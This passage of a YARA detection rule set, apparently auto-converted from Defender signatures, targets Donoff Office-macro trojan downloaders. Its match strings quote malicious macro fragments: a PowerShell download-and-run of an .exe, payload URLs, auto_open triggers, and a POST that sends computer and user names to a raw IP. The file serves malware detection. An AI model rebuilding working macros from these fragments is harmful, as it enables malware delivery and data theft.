        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CSM_2147839755_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CSM!MTB"
        threat_id = "2147839755"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {7d 70 61 73 73 74 68 72 75 3b 69 6e 76 6f 6b 65 2d 77 65 62 72 65 71 75 65 73 74 2d 75 72 69 22 22 02 04 05 68 74 74 70 68 74 74 70 73 3a 2f 2f [0-47] 2f [0-31] 2e 65 78 65 22 22 2d 6f 75 74 66 69 6c 65 24 74 65 6d 70 66 69 6c 65 3b 73 74 61 72 74 2d 70 72 6f 63 65 73 73 24 74 65 6d 70 66 69 6c 65 3b 64 65 62 75 67 2e 70 72 69 6e 74 73 63 6f 6d 6d 61 6e 64 73 65 74 6f 77 73 68 73 68 65 6c 6c 3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 73 65 74 6f 77 73 68 73 68 65 6c 6c 65 78 65 63 3d 6f 77 73 68 73 68 65 6c 6c 2e 65 78 65 63 28 73 63 6f 6d 6d 61 6e 64 29 73 6f 75 74 70 75 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ESM_2147839811_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ESM!MTB"
        threat_id = "2147839811"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 66 79 66 2f [0-16] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {28 22 66 79 66 2f [0-79] 2f 68 6f 6a 6d 73 76 69 2e 74 6b 2f 78 78 78 30 30 3b 74 71 75 75 69 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FSM_2147839812_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FSM!MTB"
        threat_id = "2147839812"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"c\" & StrReverse(\"\"\" \"\"\"\" trats\" & \" c\" & HUiu827TYRH) & ewallLIsp_3R & \"\"\"\", 0, False" ascii //weight: 1
        $x_1_2 = "\"c\" & StrReverse(KMKM & CCCC & HUiu827TYRH) & StrReverse(\"rid\") & \" \"\"\" & Mid(ewallLIsp_3R, 1, Len(ewallLIsp_3R) -" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_GSM_2147839955_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.GSM!MTB"
        threat_id = "2147839955"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "printed(\"2ht40t1p11s4:6/12/3d6op66ler90to8ol1.c4o0m4\")" ascii //weight: 1
        $x_1_2 = "printed(\"9r4u5n5d3l1l1\") & 32 & \" \" & U & mesterius" ascii //weight: 1
        $x_1_3 = "mesterius = printed(\"12,7#9004\") & 6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HSM_2147843569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HSM!MTB"
        threat_id = "2147843569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "raw.githubusercontent.com/Pjoao1578/Upcrypter/main/Expploiiiter" ascii //weight: 1
        $x_1_2 = ".Run \"WScript.exe QlpKx.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HSM_2147843569_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HSM!MTB"
        threat_id = "2147843569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"fyf/qtsn\")" ascii //weight: 1
        $x_1_2 = "(\"fyf/eihgiubc0igtwhtsuxsxfgfkiihnkithizeihtgoihgkzgkvhjlihgehkhelce{ghg0izuopgnpd0npd/tbojeobspudbsu/xxx00;tquui\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QR_2147894547_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QR!MTB"
        threat_id = "2147894547"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"/ph/:tt\")" ascii //weight: 1
        $x_1_2 = "(\"p/:/tht\")" ascii //weight: 1
        $x_1_3 = "performWrite" ascii //weight: 1
        $x_1_4 = "(\"3 u2dnrll\")" ascii //weight: 1
        $x_1_5 = "(\"d ll2ru3n\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QS_2147896236_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QS!MTB"
        threat_id = "2147896236"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shift = (Asc(Mid(key, (k Mod Len(key)) + 1, 1)) Mod Len(s)) + 1" ascii //weight: 1
        $x_1_2 = "& Mid(s, shift, 1)" ascii //weight: 1
        $x_1_3 = "= Mid(s, 1, pos - 1) & Mid(s, pos + 1, Len(s))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SWW_2147899441_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SWW!MTB"
        threat_id = "2147899441"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"URLDownloadToFileA\" (ByVal FiMxshBsjwHqpdOqMY As Long, _" ascii //weight: 1
        $x_1_2 = "= Environ$(\"AppData\") & \"\\\" & VJgvCVGHdgvjIOGFJCHGXFxfjcgkcvgv" ascii //weight: 1
        $x_1_3 = "= KBHhbdrg(\"fyf/ygt/tklgoel0tuofuopdtk0npd/tbojeobspudbsu/xxx00;tquui\")" ascii //weight: 1
        $x_1_4 = "WIkGF 0, \"open\", HVjgfvjvvHKGKGJFgfDxdryTFTiUYKGUtfudr, \"\", vbNullString, vbNormalFocus" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RVB_2147929524_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RVB!MTB"
        threat_id = "2147929524"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=createobject(\"scri\"+\"pting.dict\"+\"ionary\")symboldict.add\"??\",chrw(&h430)symboldict.add\"**\",chrw(&h43e)" ascii //weight: 1
        $x_1_2 = "mid(folderpath,envvarstart+1,envvarend-envvarstart-1)folderpath=replace(folderpath,\"%\"&envvar&\"%\",environ(envvar))" ascii //weight: 1
        $x_1_3 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 64 65 63 6f 64 65 63 6f 6e 74 65 6e 74 [0-10] 68 65 61 64 65 72 73 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RVC_2147935198_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RVC!MTB"
        threat_id = "2147935198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttp://couldmailauth.com/zhq93e8hsj93793892378hhxhb/reghjok_64.dll" ascii //weight: 1
        $x_1_2 = "=generaterandomstring&mid(chars,int(rnd*len(chars))+1,1)nextiendfunction" ascii //weight: 1
        $x_1_3 = "subauto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SRH_2147945888_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SRH!MSR"
        threat_id = "2147945888"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Open \"POST\", \"http://38.180.206.61/engine.php\"" ascii //weight: 2
        $x_1_2 = "Environ(\"COMPUTERNAME\")" ascii //weight: 1
        $x_1_3 = "Environ(\"Username\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

